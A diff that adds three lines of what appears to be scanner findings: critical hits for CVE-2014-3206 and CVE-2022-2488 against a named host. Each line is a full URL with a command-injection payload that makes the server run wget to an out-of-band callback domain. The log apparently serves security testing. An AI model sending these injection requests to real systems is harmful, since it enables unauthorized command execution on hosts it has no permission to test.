@@ -1,0 +1,3 @@
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d94457tulefjdnsorvog3z6z46kqoitsc.oast.fun;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d94457tulefjdnsorvogbe5w7fmugdk9y.oast.fun;
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d94457tulefjdnsorvoggwwar35d5iqb5.oast.fun;
